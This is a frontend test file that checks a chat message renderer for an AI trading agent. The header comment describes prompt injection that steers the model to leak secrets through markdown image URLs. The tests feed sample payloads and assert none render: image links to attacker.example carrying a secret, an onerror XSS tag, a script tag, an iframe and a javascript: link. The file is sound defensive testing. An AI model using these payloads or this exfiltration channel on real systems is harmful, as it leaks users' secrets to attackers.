/**
 * The two rendering controls in Message.tsx that are security, not style.
 *
 * The model is untrusted input. It reads tool output, symbol names and broker
 * rejection text, any of which can carry someone else's instructions, so what
 * it emits must be rendered and never interpreted:
 *
 * - `skipHtml` with no `rehype-raw`, so raw HTML never becomes elements.
 * - `img: () => null`, so a markdown image never issues a request. An image URL
 *   is an exfiltration channel: a model steered by injected content embeds a
 *   secret in a URL the browser then fetches to an attacker's host, with nobody
 *   clicking anything.
 *
 * Both are pinned here so a later edit that softens either one fails a test
 * rather than shipping.
 */

import { render, screen } from '@testing-library/react'
import { describe, expect, it, vi } from 'vitest'
import { createAgentMessage } from '@/lib/agent/useAgentStream'
import { Message, splitAtOpenFence } from './Message'

// The editors mount CodeMirror, which is irrelevant to what is being asserted
// and slow in jsdom. Stubbing them keeps the failure of one of these tests
// unambiguous.
vi.mock('@/components/ui/python-editor', () => ({
  PythonEditor: ({ value }: { value: string }) => <div data-testid="python-editor">{value}</div>,
}))
vi.mock('@/components/ui/json-editor', () => ({
  JsonEditor: ({ value }: { value: string }) => <div data-testid="json-editor">{value}</div>,
}))

function renderAssistant(content: string) {
  return render(<Message message={createAgentMessage('assistant', content)} />)
}

describe('Message rendering controls', () => {
  it('renders no img element for a markdown image', () => {
    const { container } = renderAssistant(
      'Here is the chart:\n\n![alt text](https://attacker.example/leak?secret=abcd1234)\n'
    )
    expect(container.querySelectorAll('img')).toHaveLength(0)
    expect(container.innerHTML).not.toContain('attacker.example')
  })

  it('renders no img element for a reference-style markdown image', () => {
    const { container } = renderAssistant(
      '![alt][ref]\n\n[ref]: https://attacker.example/pixel.gif\n'
    )
    expect(container.querySelectorAll('img')).toHaveLength(0)
    expect(container.innerHTML).not.toContain('attacker.example')
  })

  it('drops a raw img tag instead of parsing it into an element', () => {
    const { container } = renderAssistant(
      'Reading your positions.\n\n<img src="x" onerror="alert(1)">\n'
    )
    expect(container.querySelectorAll('img')).toHaveLength(0)
    expect(container.innerHTML).not.toContain('onerror')
  })

  it('drops a raw script tag instead of parsing it into an element', () => {
    const { container } = renderAssistant('<script>window.stolen = 1</script>\n\nDone.\n')
    expect(container.querySelectorAll('script')).toHaveLength(0)
    expect(container.innerHTML).not.toContain('window.stolen')
    expect(screen.getByText('Done.')).toBeInTheDocument()
  })

  it('does not turn benign raw HTML into elements either', () => {
    // Nothing is being sanitised, because nothing is being parsed. A tag that
    // survived here would mean an allowlist had appeared somewhere.
    const { container } = renderAssistant('A <b>bold</b> claim.\n')
    expect(container.querySelectorAll('b')).toHaveLength(0)
  })

  it('renders an iframe from raw HTML as nothing at all', () => {
    const { container } = renderAssistant('<iframe src="https://attacker.example"></iframe>\n')
    expect(container.querySelectorAll('iframe')).toHaveLength(0)
    expect(container.innerHTML).not.toContain('attacker.example')
  })

  it('still renders ordinary prose and links', () => {
    const { container } = renderAssistant('See [the docs](https://docs.openalgo.in) for more.\n')
    const link = container.querySelector('a')
    expect(link).not.toBeNull()
    expect(link?.getAttribute('href')).toBe('https://docs.openalgo.in')
    expect(link?.getAttribute('rel')).toContain('noopener')
  })

  it('does not render a javascript: link as a usable href', () => {
    const { container } = renderAssistant('[click](javascript:alert(1))\n')
    const link = container.querySelector('a')
    expect(link?.getAttribute('href') ?? '').not.toContain('javascript:')
  })

  it('mounts the editor only once a python fence has closed', () => {
    const { queryByTestId, rerender } = render(
      <Message message={createAgentMessage('assistant', '```python\nx = 1\n')} />
    )
    expect(queryByTestId('python-editor')).toBeNull()

    rerender(<Message message={createAgentMessage('assistant', '```python\nx = 1\n```\n')} />)
    expect(queryByTestId('python-editor')).not.toBeNull()
  })
})

describe('splitAtOpenFence', () => {
  it('reports no open fence for text that has none', () => {
    const split = splitAtOpenFence('Just prose.')
    expect(split).toEqual({
      closed: 'Just prose.',
      openLanguage: null,
      openCode: '',
      hasOpenFence: false,
    })
  })

  it('reports no open fence once the block has closed', () => {
    const text = 'Before\n```python\nx = 1\n```\nAfter'
    const split = splitAtOpenFence(text)
    expect(split.hasOpenFence).toBe(false)
    expect(split.closed).toBe(text)
  })

  it('splits at an unterminated fence', () => {
    const split = splitAtOpenFence('Before\n```python\nx = 1\ny = 2')
    expect(split.hasOpenFence).toBe(true)
    expect(split.closed).toBe('Before')
    expect(split.openLanguage).toBe('python')
    expect(split.openCode).toBe('x = 1\ny = 2')
  })

  it('treats the other fence character inside a fence as content', () => {
    const split = splitAtOpenFence('```python\n~~~\nstill inside')
    expect(split.hasOpenFence).toBe(true)
    expect(split.openCode).toBe('~~~\nstill inside')
  })

  it('does not close a fence on a line that names a language', () => {
    const split = splitAtOpenFence('```\n```python\n')
    expect(split.hasOpenFence).toBe(true)
    expect(split.openLanguage).toBe(null)
  })

  it('handles a second fence opening after the first closed', () => {
    const split = splitAtOpenFence('```json\n{}\n```\ntext\n```python\nx = 1')
    expect(split.hasOpenFence).toBe(true)
    expect(split.openLanguage).toBe('python')
    expect(split.closed).toBe('```json\n{}\n```\ntext')
  })
})
